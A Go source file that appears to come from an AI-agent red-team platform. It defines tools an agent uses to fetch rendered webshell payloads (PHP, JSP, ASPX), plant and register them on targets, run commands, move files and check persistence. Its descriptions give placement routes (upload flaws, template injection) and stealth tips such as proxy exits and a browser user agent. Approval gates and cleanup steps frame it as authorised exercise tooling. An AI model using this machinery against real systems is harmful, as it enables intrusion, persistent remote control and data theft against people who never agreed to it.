package agent

// WebShell 会话工具：把「目标上那把马」变成可复用、可查活、可清理的通道。
//
// 为什么需要这组工具而不是让 agent 自己 curl：
//   - 一句话马的请求格式（参数名、编码、标记）靠模型现编，十次有八次拿不到
//     回显，最后用「命令没输出」冒充结论；工具把这层协议固定下来。
//   - 马是要留在目标上的东西。留了哪些、在哪、谁上传的，必须有台账，否则
//     收尾时没人删得干净——这正是演练复盘里最常见的扣分项。
//   - 会话属于当前任务。跨任务共享目标控制权是审计事故，不是效率优化。
//
// 审批语义（与 listener / pivot 一致）：
//   - 登记（webshell_add）、执行（webshell_exec）、清理（webshell_remove）走
//     拦截规则（ask）——这三件事都会在马所在的目标上留下可观测动作。
//   - 列表、取载荷、下载、巡检是只读或轻探测，不走拦截。

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/chu0119/pojun/webshell"

	actool "github.com/Autumn-27/norma/tool"
)

// WebShell 依赖经 Runtime 取（见 runtime.go）；取不到时报「未启用」而不是 panic——工具表可以被
// 绑到任何 agent，包括在一个没有 store 的旁路会话里。

// SetWebShellManager wires the process-wide webshell manager.
func SetWebShellManager(m *webshell.Manager) {
	setDefaultRuntime(func(r *Runtime) { r.WebShell = m })
}

func (t *ToolSet) wsUnavailable() (actool.Result, bool) {
	if t.rtShell() == nil {
		return actool.Errorf("WebShell 会话管理未启用（服务端未初始化 webshell manager）"), true
	}
	return actool.Result{}, false
}

// wsList 是给模型的会话投影（与网页同一份 View，不含 param 与 header 值）。
func (t *ToolSet) wsList(taskID int64) []webshell.View {
	if t.rtShell() == nil {
		return nil
	}
	return t.rtShell().List(taskID)
}

// webshellPayloadList 列出内置 + 自备载荷。
func (t *ToolSet) webshellPayloadList() actool.CoreTool {
	return readTool(
		"webshell_payload_list",
		"(WebShell)列出可用载荷模板。内置 4 个最小可用载荷（php eval / php 命令 / jsp / aspx），"+
			"另可读自备库 POJUN_WEBSHELL_PAYLOAD_DIR（<dir>/php|jsp|aspx/*）。\n"+
			"返回每条的名称、类型、适用场景、权限继承说明。\n"+
			"用途：要在目标上落马时先看有什么；落完用 webshell_add 登记。",
		obj(map[string]any{
			"type": map[string]any{"type": "string", "description": "只看某一类：php / php_raw / jsp / aspx（不填=全部）。"},
		}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var p struct {
				Type string `json:"type"`
			}
			_ = json.Unmarshal(in, &p)
			all := webshell.ListTemplates()
			items := make([]webshell.Template, 0, len(all))
			for _, tp := range all {
				if p.Type != "" && tp.Type != p.Type {
					continue
				}
				items = append(items, tp)
			}
			out, _ := json.MarshalIndent(map[string]any{
				"items":       items,
				"payload_dir": webshell.PayloadDir(),
				"placeholder": webshell.ParamPlaceholder,
				"next_step":   "webshell_payload_get 取全文 → 自己想办法写到目标（上传/文件写入/注入）→ webshell_add 登记",
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellPayloadGet 取载荷全文（已渲染参数名）。
func (t *ToolSet) webshellPayloadGet() actool.CoreTool {
	return readTool(
		"webshell_payload_get",
		"(WebShell)取一份载荷的完整内容，并把 {{PARAM}} 换成指定参数名。\n"+
			"返回可直接写到目标上的代码（已剥掉文件头说明注释）。\n"+
			"注意：落地方式由你决定（webshell_upload 只能经已有会话写文件；首次落地要靠别的入口："+
			"文件上传漏洞、任意写、模板注入、或已拿到的命令执行）。落地后必须 webshell_add 登记，并填 remote_path。",
		obj(map[string]any{
			"name":  str("载荷名（webshell_payload_list 里的 name 或 file），例：builtin/php-eval"),
			"param": str("参数名，写进载荷里；不填用 pass。登记会话时要用同一个。"),
		}, "name"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var p struct {
				Name  string `json:"name"`
				Param string `json:"param"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			tp, err := webshell.GetTemplate(p.Name)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			param := p.Param
			if param == "" {
				param = "pass"
			}
			body := tp.Render(param)
			out, _ := json.MarshalIndent(map[string]any{
				"name":          tp.Name,
				"type":          tp.Type,
				"param":         param,
				"content":       body,
				"size":          len(body),
				"summary":       tp.Summary,
				"register_hint": fmt.Sprintf(`落完调 webshell_add(url="http://target/路径", type=%q, param=%q, remote_path="绝对路径")`, tp.Type, param),
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellAdd 登记会话。
func (t *ToolSet) webshellAdd() actool.CoreTool {
	return writeTool(
		"webshell_add",
		"(WebShell)登记一条已落地的 webshell 会话，之后可复用执行/传文件/巡检。\n"+
			"只登记「已经能访问到」的马——先自己确认 URL 打得开且马在执行（或登记后立刻 webshell_probe）。\n"+
			"类型语义：php（eval 型，平台自动探测 eval/base64 两种载荷）/ php_raw（只吃 PHP 代码）/ "+
			"jsp、aspx（命令型，载荷直接是命令行）。\n"+
			"remote_path 很重要：它是清痕迹时删马用的路径，填错会删不掉。PHP 马可留空（平台会让马自报，靠 __FILE__ 三级回退）。\n"+
			"proxy 用于隔离出口：目标侧只会看到代理 IP，看不到平台地址。多目标演练建议给每条会话配同一个出口。",
		obj(map[string]any{
			"name":        str("会话名（1-64 字符，不含 / 与 \\）。不填按主机名自动生成。"),
			"url":         str("马的完整 URL，含 http(s)://。例：http://10.0.0.5/upload/x.php"),
			"type":        str("php / php_raw / jsp / aspx"),
			"param":       str("请求参数名（不是口令），默认 pass。必须与载荷里的一致。"),
			"method":      str("GET 或 POST，默认 POST。"),
			"remote_path": str("马在目标上的绝对路径。例：/var/www/html/x.php 或 C:\\inetpub\\wwwroot\\x.aspx"),
			"note":        str("备注，例：边界 Web-01 / 从上传漏洞落地"),
			"header": map[string]any{
				"type":        "object",
				"description": "额外请求头（如某些马要求 X-Forwarded-For 或自定义鉴权）。值不会出现在任何列表返回里。",
			},
			"proxy":        str("出口代理：socks5h://[user:pass@]host:port 或 http://...，也支持逗号分隔的池。空=直连（会在页面上显示「直连」）。"),
			"user_agent":   str("覆盖默认 UA（默认是普通浏览器 UA，不自报工具名）。"),
			"proxy_rotate": map[string]any{"type": "boolean", "description": "代理池是否每次请求换出口。默认 false（同一会话固定出口更不显眼）。"},
			"overwrite":    map[string]any{"type": "boolean", "description": "同名会话是否覆盖。默认 false（避免静默覆盖别人登记的入口）。"},
		}, "url", "type"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsUnavailable(); bad {
				return r, nil
			}
			var p struct {
				Name        string            `json:"name"`
				URL         string            `json:"url"`
				Type        string            `json:"type"`
				Param       string            `json:"param"`
				Method      string            `json:"method"`
				RemotePath  string            `json:"remote_path"`
				Note        string            `json:"note"`
				Header      map[string]string `json:"header"`
				Proxy       string            `json:"proxy"`
				UserAgent   string            `json:"user_agent"`
				ProxyRotate bool              `json:"proxy_rotate"`
				Overwrite   bool              `json:"overwrite"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if err := webshell.ValidateProxy(p.Proxy); err != nil {
				return actool.Errorf(err.Error()), nil
			}
			v, err := t.rtShell().Add(webshell.AddOptions{
				Name: p.Name, URL: p.URL, Type: p.Type, Param: p.Param, Method: p.Method,
				Header: p.Header, Note: p.Note, TaskID: t.taskID, RemotePath: p.RemotePath,
				Proxy: p.Proxy, UserAgent: p.UserAgent, ProxyRotate: p.ProxyRotate,
				Overwrite: p.Overwrite,
			})
			if err != nil {
				return actool.Errorf("登记失败: " + err.Error()), nil
			}
			out, _ := json.MarshalIndent(map[string]any{
				"ok":      true,
				"session": v,
				"next":    "webshell_probe 确认可用；不可用时先看 state（unreachable / not_mine）再决定换马还是改参数名",
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellList 列会话。
func (t *ToolSet) webshellList() actool.CoreTool {
	return readTool(
		"webshell_list",
		"(WebShell)列出本任务已登记的会话。不含参数名与请求头值（脱敏）。\n"+
			"用来看「我手上有几个入口、分别在哪个目标、出口是直连还是代理」。",
		obj(map[string]any{}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsUnavailable(); bad {
				return r, nil
			}
			items := t.wsList(t.taskID)
			out, _ := json.MarshalIndent(map[string]any{
				"items": items,
				"count": len(items),
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellExec 执行命令。
func (t *ToolSet) webshellExec() actool.CoreTool {
	return writeTool(
		"webshell_exec",
		"(WebShell)在已登记的会话上执行命令。两种用法：\n"+
			"① command：执行一条命令，返回 stdout（简单场景）。\n"+
			"② commands：一次发多条命令（最多 16 条），返回 results[] 结构化结果——"+
			"每条带 index/command/ok/output/exit_code/mode。eval 型 PHP 会话能拿到真实退出码，"+
			"命令型马（raw/jsp/aspx）或 exec 被禁用时 exit_code=-1（表示不知道，不编造）。\n"+
			"批量适合一次排查要连着跑 id/uname/whoami/ip 等多条的场景：一次 HTTP 往返拿全，模型不必从拼接文本里猜哪行属于哪条。\n"+
			"PHP 会话自动探测载荷模式：先按 eval（PHP 代码）发，拿不到标记就退到「base64 命令」模式并缓存。\n"+
			"命令里可以带引号、管道、中文——平台会 base64 包装，不会被传输层截断。\n"+
			"看不出回显时优先怀疑三件事：马类型填错（例如把命令型 jsp 填成 php）、WAF 拦截（会明确报「拦截页」）、"+
			"命令本身无输出（加 2>&1 或换 echo 测试）。\n"+
			"执行是审批动作：它会在目标日志里留下一次请求。",
		obj(map[string]any{
			"name":    str("会话名（webshell_list 查）"),
			"command": str("单条命令（与 commands 二选一）。例：id；uname -a；ls -la /var/www"),
			"commands": map[string]any{
				"type":        "array",
				"items":       map[string]any{"type": "string"},
				"description": "批量命令数组（与 command 二选一，最多 16 条）。给了它就用结构化批量执行。",
			},
			"timeout_seconds": map[string]any{
				"type": "integer", "default": 30,
				"description": "单次请求超时秒数（默认 30）。批量时是整批的超时。",
			},
		}, "name"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsUnavailable(); bad {
				return r, nil
			}
			var p struct {
				Name           string   `json:"name"`
				Command        string   `json:"command"`
				Commands       []string `json:"commands"`
				TimeoutSeconds int      `json:"timeout_seconds"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			timeout := time.Duration(p.TimeoutSeconds) * time.Second
			// 批量路径：给了 commands 就用结构化执行。
			if len(p.Commands) > 0 {
				results, err := t.rtShell().ExecBatch(ctx, p.Name, "", p.Commands, timeout)
				if err != nil {
					return actool.Errorf("批量执行失败: " + err.Error()), nil
				}
				out, _ := json.MarshalIndent(map[string]any{
					"ok": true, "batch": true, "results": results, "count": len(results),
				}, "", "  ")
				return actool.Text(string(out)), nil
			}
			// 单条路径（向后兼容）。
			if strings.TrimSpace(p.Command) == "" {
				return actool.Errorf("command 或 commands 至少要给一个"), nil
			}
			res, err := t.rtShell().Exec(ctx, p.Name, p.Command, timeout)
			if err != nil {
				return actool.Errorf("执行失败: " + err.Error()), nil
			}
			out, _ := json.MarshalIndent(map[string]any{
				"ok":        true,
				"output":    res.Output,
				"mode":      res.Mode,
				"egress":    res.Egress,
				"truncated": res.Truncated,
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellUpload 上传文件。
func (t *ToolSet) webshellUpload() actool.CoreTool {
	return writeTool(
		"webshell_upload",
		"(WebShell)经会话把文件写到目标。两种来源二选一：content_b64（内容 base64）或 local_path（平台本机文件）。\n"+
			"PHP 会话按 512KB 分块写（每块有独立回执，断了能精确定位到第几块）；命令型马单块上限 512KB。\n"+
			"写过的路径会记进会话的 artifacts，webshell_remove(remove_remote=true) 时一并清理。\n"+
			"大文件（>32MB）不要走这里：用 stage_share 投递，或换 PHP 会话分块。",
		obj(map[string]any{
			"name":        str("会话名"),
			"remote_path": str("目标上的绝对路径，含文件名。例：/tmp/tools/fscan 或 C:\\Windows\\Temp\\a.exe"),
			"content_b64": str("文件内容的 base64（小文件用）"),
			"local_path":  str("平台本机文件路径（大文件用，读的是运行平台的那台机器）"),
			"chunk_size": map[string]any{
				"type": "integer", "default": 524288,
				"description": "分块大小（4KB-512KB），默认 512KB。目标有 body 长度限制时调小。",
			},
		}, "name", "remote_path"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsUnavailable(); bad {
				return r, nil
			}
			var p struct {
				Name       string `json:"name"`
				RemotePath string `json:"remote_path"`
				ContentB64 string `json:"content_b64"`
				LocalPath  string `json:"local_path"`
				ChunkSize  int    `json:"chunk_size"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			var data []byte
			switch {
			case strings.TrimSpace(p.ContentB64) != "":
				raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(p.ContentB64))
				if err != nil {
					return actool.Errorf("content_b64 不是合法 base64: " + err.Error()), nil
				}
				data = raw
			case strings.TrimSpace(p.LocalPath) != "":
				raw, err := os.ReadFile(strings.TrimSpace(p.LocalPath))
				if err != nil {
					return actool.Errorf("读本机文件失败: " + err.Error()), nil
				}
				data = raw
			default:
				return actool.Errorf("要给 content_b64 或 local_path 其中之一"), nil
			}
			res, err := t.rtShell().Upload(ctx, p.Name, p.RemotePath, data, p.ChunkSize, 0)
			if err != nil {
				return actool.Errorf("上传失败: " + err.Error()), nil
			}
			out, _ := json.MarshalIndent(map[string]any{"ok": true, "result": res}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellDownload 下载文件。
func (t *ToolSet) webshellDownload() actool.CoreTool {
	return readTool(
		"webshell_download",
		"(WebShell)经会话读目标上的文件。文本内容直接返回；二进制返回 base64（受 max_bytes 限制）。\n"+
			"默认只读 2MB，上限 64MB——要拖大文件说明这个入口选错了（该用别的通道），"+
			"而不是把平台内存和上下文一起撑爆。",
		obj(map[string]any{
			"name":        str("会话名"),
			"remote_path": str("目标文件绝对路径"),
			"max_bytes": map[string]any{
				"type": "integer", "default": 2097152,
				"description": "最多读多少字节（默认 2MB，上限 64MB）。超出部分丢弃并在 truncated 里标出。",
			},
		}, "name", "remote_path"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsUnavailable(); bad {
				return r, nil
			}
			var p struct {
				Name       string `json:"name"`
				RemotePath string `json:"remote_path"`
				MaxBytes   int    `json:"max_bytes"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			res, err := t.rtShell().Download(ctx, p.Name, p.RemotePath, p.MaxBytes, 0)
			if err != nil {
				return actool.Errorf("下载失败: " + err.Error()), nil
			}
			body := map[string]any{
				"ok":          true,
				"remote_path": res.RemotePath,
				"bytes":       res.Bytes,
				"remote_size": res.RemoteSize,
				"truncated":   res.Truncated,
				"text":        res.Text,
				"mode":        res.Mode,
				"egress":      res.Egress,
			}
			if res.Text {
				body["content"] = string(res.Data)
			} else {
				body["content_b64"] = base64.StdEncoding.EncodeToString(res.Data)
			}
			out, _ := json.MarshalIndent(body, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellProbe 巡检。
func (t *ToolSet) webshellProbe() actool.CoreTool {
	return readTool(
		"webshell_probe",
		"(WebShell)检查会话是否还活着，并给出三种失效的区分：\n"+
			"  ok          —— 马在响应，执行正常\n"+
			"  unreachable —— 连不上（目标下线 / 端口变了 / 网络不通）\n"+
			"  not_mine    —— 连上了但不是这条会话的马（被删 / 参数名改了 / WAF 拦截页）\n"+
			"deep=true 时额外跑 id/whoami，把当前身份记下来——「现在还是不是我」是权限维持的第一件事。\n"+
			"name 留空巡检本任务全部会话（并发 4）。",
		obj(map[string]any{
			"name": str("会话名；留空=巡检本任务全部"),
			"deep": map[string]any{"type": "boolean", "description": "是否取当前身份（id / whoami）。默认 false。"},
		}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsUnavailable(); bad {
				return r, nil
			}
			var p struct {
				Name string `json:"name"`
				Deep bool   `json:"deep"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if strings.TrimSpace(p.Name) != "" {
				res, err := t.rtShell().Probe(ctx, p.Name, p.Deep, 0)
				if err != nil {
					return actool.Errorf("巡检失败: " + err.Error()), nil
				}
				out, _ := json.MarshalIndent(res, "", "  ")
				return actool.Text(string(out)), nil
			}
			list := t.rtShell().ProbeAll(ctx, t.taskID, p.Deep, 0)
			alive, bad2 := 0, 0
			for _, r := range list {
				if r.Alive {
					alive++
				} else {
					bad2++
				}
			}
			out, _ := json.MarshalIndent(map[string]any{
				"items": list, "alive": alive, "failed": bad2,
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellRemove 清理会话。
func (t *ToolSet) webshellRemove() actool.CoreTool {
	return writeTool(
		"webshell_remove",
		"(WebShell)清理会话。默认只摘登记、不动远端（马留不留由人决定）。\n"+
			"remove_remote=true 才动远端，顺序是：先删经 upload 写上去的 artifacts → 最后自删马本身 → "+
			"再请求一次原 URL 复查打不通 → 才摘登记。\n"+
			"远端没清干净会报错并保留登记；确认要丢弃登记必须显式 force=true（会在返回里标明「远端可能仍有残留」）。\n"+
			"演练收尾时必须逐条处理：留着的马是下一轮对抗的隐患，也是复盘里最常见的扣分项。",
		obj(map[string]any{
			"name":          str("会话名"),
			"remove_remote": map[string]any{"type": "boolean", "description": "是否同时清远端落地物（马 + 上传的 artifacts）。默认 false。"},
			"force":         map[string]any{"type": "boolean", "description": "复查未通过也摘登记。默认 false。"},
		}, "name"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsUnavailable(); bad {
				return r, nil
			}
			var p struct {
				Name         string `json:"name"`
				RemoveRemote bool   `json:"remove_remote"`
				Force        bool   `json:"force"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			res, err := t.rtShell().Purge(ctx, p.Name, webshell.PurgeOptions{
				RemoveRemote: p.RemoveRemote,
				Force:        p.Force,
			})
			if err != nil {
				return actool.Errorf("清理失败: " + err.Error()), nil
			}
			out, _ := json.MarshalIndent(map[string]any{"ok": true, "result": res}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}
